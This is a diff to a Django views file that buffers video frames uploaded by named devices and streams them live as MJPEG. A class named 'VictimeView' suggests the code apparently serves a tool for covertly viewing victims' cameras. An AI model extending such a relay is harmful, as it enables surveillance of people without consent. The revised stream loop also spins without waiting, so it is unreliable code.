@@ -10,6 +10,7 @@ from .serializers import *
 from .models import *
 import queue
 import os
+import time
 
 def get_client_ip(request):
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
@@ -18,8 +19,6 @@ def get_client_ip(request):
     else:
         ip = request.META.get('REMOTE_ADDR')
     return ip
-
-
 
 # Dictionary to store buffers for each device
 device_buffers = {}
@@ -37,13 +36,21 @@ class UploadStreamView(View):
             return HttpResponse("Missing device_name", status=400)
 
         if device_name not in device_buffers:
-            device_buffers[device_name] = queue.Queue(maxsize=5)
+            device_buffers[device_name] = queue.Queue(maxsize=10)  # Buffer size increased for stability
 
         try:
-            if device_buffers[device_name].qsize() >= 5:  
+            # Capture the frame data
+            frame_data = request.body
+
+            # If the buffer is full, discard the oldest frame to avoid blocking
+            if device_buffers[device_name].qsize() >= 10:
                 device_buffers[device_name].get_nowait()
-            device_buffers[device_name].put(request.body, block=False)
+
+            # Add the frame to the buffer
+            device_buffers[device_name].put(frame_data)
+
             return HttpResponse("Frame received", status=200)
+
         except queue.Full:
             return HttpResponse(f"Buffer full for device: {device_name}", status=429)
 
@@ -58,12 +65,12 @@ class StreamView(View):
         def generate():
             buffer = device_buffers[device_name]
             while True:
-                frame = buffer.get()
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+                if not buffer.empty():
+                    frame_data = buffer.get()
+                    yield (b'--frame\r\n'
+                           b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
 
         return StreamingHttpResponse(generate(), content_type='multipart/x-mixed-replace; boundary=frame')
-
 
 class VictimeView(APIView):
     def get(self, request):
